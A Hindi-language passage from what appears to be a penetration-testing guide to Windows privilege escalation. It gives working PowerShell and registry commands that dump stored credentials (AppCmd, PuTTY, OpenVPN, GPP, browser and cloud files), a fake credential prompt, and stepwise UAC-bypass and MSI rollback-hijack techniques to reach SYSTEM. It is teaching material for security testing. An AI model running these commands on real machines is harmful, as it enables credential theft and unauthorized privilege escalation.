### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey` के साथ **Mimikatz** के `dpapi::rdg` module का उपयोग करके **किसी भी .rdg files को decrypt करें**\
आप Mimikatz के `sekurlsa::dpapi` module से memory से **कई DPAPI masterkeys extract कर सकते हैं**

### Sticky Notes

लोग अक्सर Windows workstations पर **passwords** और अन्य जानकारी **save करने** के लिए StickyNotes app का उपयोग करते हैं, यह समझे बिना कि यह एक database file है। यह file `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित होती है और इसे खोजना तथा जांचना हमेशा उपयोगी होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपका Administrator होना और High Integrity level के अंतर्गत run करना आवश्यक है।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित होती है।\
यदि यह file मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से extract किया गया है:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
Installers को **SYSTEM privileges के साथ run किया जाता है**, और कई **DLL Sideloading के प्रति vulnerable हैं (जानकारी [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files और Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर store किया जा सकता है, इसलिए आपको जाँच करनी चाहिए कि वहाँ कुछ interesting है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस path के अंदर कोई entry मिलती है, तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में stored होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypted किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service running नहीं है और आप चाहते हैं कि यह boot पर automatically start हो, तो run करें:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब valid नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` के साथ जोड़ने और ssh के माध्यम से किसी machine में login करने का प्रयास किया। Registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन files को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM और SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** नाम की file खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जो Group Policy Preferences (GPP) के माध्यम से machines के समूह पर custom local administrator accounts deploy करने की अनुमति देती थी। हालांकि, इस method में गंभीर security flaws थे। सबसे पहले, SYSVOL में XML files के रूप में stored Group Policy Objects (GPOs) को कोई भी domain user access कर सकता था। दूसरे, इन GPPs में मौजूद passwords, जो publicly documented default key का उपयोग करके AES256 से encrypted थे, किसी भी authenticated user द्वारा decrypted किए जा सकते थे। इससे गंभीर risk उत्पन्न होता था, क्योंकि users elevated privileges प्राप्त कर सकते थे।

इस risk को कम करने के लिए, locally cached GPP files को scan करने वाला एक function विकसित किया गया, जिसमें ऐसा `"cpassword"` field हो जो empty न हो। ऐसी file मिलने पर, function password को decrypt करता है और एक custom PowerShell object return करता है। इस object में GPP और file के location से संबंधित details शामिल होती हैं, जिससे इस security vulnerability की पहचान और remediation में सहायता मिलती है।

इन files के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में search करें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials वाले web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials के लिए पूछें

आप हमेशा **user से उसके credentials या किसी अन्य user के credentials दर्ज करने के लिए कह सकते हैं**, यदि आपको लगता है कि वह उन्हें जानता हो (ध्यान दें कि **client से सीधे **credentials** मांगना वास्तव में **risky** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Credentials वाले संभावित filenames**

कुछ समय पहले **passwords** को **clear-text** या **Base64** में रखने वाली ज्ञात files
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों में खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी check करना चाहिए, ताकि उसके अंदर Credentials मिल सकें।

कई programs द्वारा saved **passwords को recover** करने के लिए आप इसका उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**Credentials वाली अन्य संभावित registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

आपको उन dbs को check करना चाहिए जहाँ **Chrome या Firefox** के passwords stored होते हैं।\
साथ ही browsers की history, bookmarks और favourites भी check करें, क्योंकि हो सकता है कि वहाँ कुछ **passwords stored हों**।

Browsers से passwords extract करने के लिए tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में built-in एक technology है, जो अलग-अलग languages के software components के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को एक **class ID (CLSID)** के माध्यम से **identified** किया जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) द्वारा identified किया जाता है।

COM classes और interfaces registry में क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत defined होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को merge करके बनाई जाती है = **HKEY\CLASSES\ROOT.**

इस registry के CLSIDs के अंदर आपको child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो एक **DLL** की ओर point करती है और **ThreadingModel** नामक एक value होती है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकती है।

![Browsers History - COM DLL Overwriting: इस registry के CLSIDs के अंदर आपको child registry InProcServer32 मिल सकती है, जिसमें एक default value होती है जो एक DLL की ओर point करती है और एक value...](<../../images/image (729).png>)

Basically, यदि आप execute होने वाली किसी भी **DLLs** को **overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं, यदि उस DLL को किसी different user द्वारा execute किया जाना हो।

Attackers COM Hijacking को persistence mechanism के रूप में कैसे use करते हैं, यह जानने के लिए देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Files और registry में Generic Password search**

**File contents search करें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है, जिसे मैंने victim के अंदर credentials खोजने वाले प्रत्येक metasploit POST module को **automatically execute** करने के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page पर बताए गए passwords वाली सभी files को automatically search करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password extract करने वाला एक और बेहतरीन tool है।

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) नामक tool कई tools (PuTTY, WinSCP, FileZilla, SuperPuTTY और RDP) के **sessions**, **usernames** और **passwords** खोजता है, जो इस data को clear text में save करते हैं।
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चलने वाला कोई process full access के साथ एक नया process** (`OpenProcess()`) **open करता है**। वही process **कम privileges के साथ एक नया process** (`CreateProcess()`) **भी create करता है, जो मुख्य process के सभी open handles inherit करता है**।\
फिर, यदि आपके पास **कम privileges वाले process का full access** है, तो आप `OpenProcess()` से बनाए गए privileged process के **open handle को प्राप्त कर सकते हैं** और उसमें **shellcode inject** कर सकते हैं।\
**इस vulnerability को detect और exploit करने के तरीके** की अधिक जानकारी के लिए [यह example पढ़ें](leaked-handle-exploitation.md)।\
[**यह अन्य post भी पढ़ें, जिसमें अलग-अलग permission levels के साथ inherit किए गए processes और threads के अधिक open handlers को test और abuse करने का अधिक पूर्ण विवरण दिया गया है (केवल full access ही नहीं)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, processes के बीच communication और data transfer को सक्षम बनाते हैं।

Windows एक feature प्रदान करता है जिसे **Named Pipes** कहा जाता है। यह असंबंधित processes को data share करने की अनुमति देता है, यहां तक कि अलग-अलग networks पर भी। यह client/server architecture जैसा होता है, जिसमें roles को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब कोई **client** किसी pipe के माध्यम से data भेजता है, तो जिस **server** ने pipe स्थापित किया है, उसमें **client की identity अपनाने** की क्षमता होती है, बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। किसी **privileged process** की पहचान करना, जो ऐसे pipe के माध्यम से communicate करता है जिसे आप mimic कर सकते हैं, आपको **अधिक privileges प्राप्त करने** का अवसर देता है। इसके लिए उस process की identity तब अपनाई जाती है जब वह आपके द्वारा स्थापित pipe के साथ interact करता है। ऐसे attack को execute करने के instructions [**यहां**](named-pipe-client-impersonation.md) और [**यहां**](#from-high-integrity-to-system) मिल सकते हैं।

इसके अलावा, निम्न tool आपको **burp जैसे tool से named pipe communication को intercept** करने की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool सभी pipes को list और देखने की अनुमति देता है, ताकि privescs खोजे जा सकें** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv), server mode में, `\\pipe\\tapsrv` (MS-TRP) को expose करती है। एक remote authenticated client mailslot-based async event path का abuse करके `ClientAttach` को किसी भी ऐसी existing file में arbitrary **4-byte write** में बदल सकता है, जो `NETWORK SERVICE` द्वारा writable हो। इसके बाद Telephony admin rights प्राप्त करके service के रूप में arbitrary DLL load की जा सकती है। पूरा flow:

- `ClientAttach` में `pszDomainUser` को किसी writable existing path पर set करें → service इसे `CreateFileW(..., OPEN_EXISTING)` के माध्यम से open करती है और async event writes के लिए इसका उपयोग करती है।
- प्रत्येक event `Initialize` से attacker-controlled `InitContext` को उस handle में write करता है। `LRegisterRequestRecipient` (`Req_Func 61`) के साथ एक line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) के माध्यम से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` में स्वयं को add करें, reconnect करें, फिर arbitrary DLL path के साथ `GetUIDllName` call करके `TSPI_providerUIIdentify` को `NETWORK SERVICE` के रूप में execute करें।

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** page देखें।

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` को forward किए गए Clickable Markdown links खतरनाक URI handlers (`file:`, `ms-appinstaller:` या किसी registered scheme) को trigger कर सकते हैं और attacker-controlled files को current user के रूप में execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब किसी user के रूप में shell प्राप्त की जाती है, तो scheduled tasks या अन्य processes execute हो सकते हैं जो **command line पर credentials pass करते हैं**। नीचे दी गई script हर दो seconds में process command lines capture करती है और current state की तुलना previous state से करती है, तथा किसी भी differences को output करती है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processes से passwords चुराना

## Low Priv User से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के माध्यम से) का access है और UAC enabled है, तो Microsoft Windows के कुछ versions में unprivileged user से terminal या किसी अन्य process को "NT\AUTHORITY SYSTEM" के रूप में run करना संभव है।

इससे privileges escalate करना और उसी vulnerability के साथ UAC bypass करना एक साथ संभव हो जाता है। इसके अतिरिक्त, कुछ भी install करने की आवश्यकता नहीं होती और इस process के दौरान उपयोग की जाने वाली binary Microsoft द्वारा signed और issued है।

Affected systems में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित steps करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium से High Integrity Level / UAC Bypass

**Integrity Levels** के बारे में सीखने के लिए इसे पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses** के बारे में सीखने के लिए इसे पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP

[**इस blog post में वर्णित**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) technique, जिसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।

यह attack मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstallation process के दौरान legitimate files को malicious files से replace करता है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में Windows Installer इसका उपयोग अन्य MSI packages की uninstallation के दौरान rollback files store करने के लिए करेगा, जहाँ rollback files को malicious payload रखने के लिए modify किया जा चुका होगा।

संक्षेप में technique इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` को खाली छोड़ना)**

- Step 1: MSI install करें
- ऐसा `.msi` बनाएँ जो किसी writable folder (`TARGETDIR`) में एक harmless file (जैसे, `dummy.txt`) install करे।
- Installer को **"UAC Compliant"** के रूप में mark करें, ताकि **non-admin user** इसे चला सके।
- Install के बाद file पर एक **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
- उसी `.msi` को uninstall करें।
- Uninstall process files को `C:\Config.Msi` में move करना और उनका नाम बदलकर `.rbf` files करना शुरू कर देता है (rollback backups)।
- `GetFinalPathNameByHandle` का उपयोग करके खुले file handle को **poll** करें, ताकि पता चल सके कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है, जो:
- `.rbf` लिखे जाने पर signal करता है।
- फिर uninstall जारी रखने से पहले किसी अन्य event का इंतज़ार करता है।

- Step 4: `.rbf` को delete होने से रोकें
- Signal मिलने पर `.rbf` file को `FILE_SHARE_DELETE` के बिना **open करें** — इससे इसे delete होने से रोका जाता है।
- फिर वापस signal करें, ताकि uninstall पूरा हो सके।
- Windows Installer `.rbf` को delete करने में fail हो जाता है और क्योंकि वह सभी contents delete नहीं कर सकता, इसलिए `C:\Config.Msi` remove नहीं होता।

- Step 5: `.rbf` को manually delete करें
- आप (attacker) `.rbf` file को manually delete करें।
- अब **`C:\Config.Msi` खाली है**, और hijack किए जाने के लिए तैयार है।

> इस बिंदु पर **SYSTEM-level arbitrary folder delete vulnerability** trigger करके `C:\Config.Msi` को delete करें।

2. **Stage 2 – Rollback Scripts को Malicious Scripts से replace करना**

- Step 6: Weak ACLs के साथ `C:\Config.Msi` को फिर से बनाएँ
- `C:\Config.Msi` folder को स्वयं फिर से बनाएँ।
- **weak DACLs** (जैसे, Everyone:F) set करें और `WRITE_DAC` के साथ एक handle खुला रखें।

- Step 7: एक और install चलाएँ
- `.msi` को फिर से install करें, जिसमें:
- `TARGETDIR`: Writable location।
- `ERROROUT`: एक variable जो forced failure trigger करता है।
- इस install का उपयोग फिर से **rollback** trigger करने के लिए किया जाएगा, जो `.rbs` और `.rbf` को पढ़ता है।

- Step 8: `.rbs` के लिए monitor करें
- `C:\Config.Msi` को monitor करने के लिए `ReadDirectoryChangesW` का उपयोग करें, जब तक कि कोई नया `.rbs` दिखाई न दे।
- उसका filename capture करें।

- Step 9: Rollback से पहले sync करें
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है, जो:
- `.rbs` बनाए जाने पर एक event signal करता है।
- फिर आगे बढ़ने से पहले wait करता है।

- Step 10: Weak ACL फिर से लागू करें
- `.rbs created` event प्राप्त करने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से लागू करता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` वाला handle है, इसलिए आप फिर से **weak ACLs** लागू कर सकते हैं।

> ACLs केवल handle open करते समय enforce होते हैं, इसलिए आप अभी भी folder में write कर सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` drop करें
- `.rbs` file को एक **fake rollback script** से overwrite करें, जो Windows को निर्देश देती है:
- आपकी `.rbf` file (malicious DLL) को किसी **privileged location** (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore करे।
- अपनी fake `.rbf` file drop करें, जिसमें **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
- Sync event को signal करें, ताकि installer फिर से शुरू हो सके।
